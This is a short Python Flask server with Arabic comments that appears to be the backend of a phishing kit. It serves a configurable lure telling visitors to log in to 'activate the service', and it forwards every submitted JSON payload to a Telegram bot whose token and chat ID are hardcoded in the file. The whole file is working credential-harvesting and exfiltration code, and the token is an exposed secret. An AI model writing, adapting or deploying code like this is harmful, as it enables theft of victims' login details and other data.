from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# ضع التوكن والأيدي الحقيقيين هنا (لا تضع روابط الموقع هنا)
TOKEN = "8713127522:AAGfj4acg204MMc0SX7keJNtP4fWN9L-lYQ"
CHAT_ID = "7984067238"

# لتخزين آخر إعدادات أرسلتها من اللوحة
latest_config = {
    "image": "https://telegra.ph/file/1792945d7d91986420551.jpg",
    "letter": "سجل دخولك لتفعيل الخدمة",
    "button": "تفعيل الآن"
}

@app.route('/api/save', methods=['POST'])
def save_data():
    global latest_config
    try:
        data = request.json
        # إذا كانت البيانات قادمة من لوحة التحكم (لتحديث الإعدادات)
        if 'image' in data and 'letter' in data:
            latest_config = data
        
        # إرسال البيانات إلى تليجرام
        full_message = f"🚀 **وصول بيانات جديدة:**\n\n{data}"
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": full_message, "parse_mode": "Markdown"})
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/get', methods=['GET'])
def get_config():
    return jsonify(latest_config)

def handler(environ, start_response):
    return app(environ, start_response)
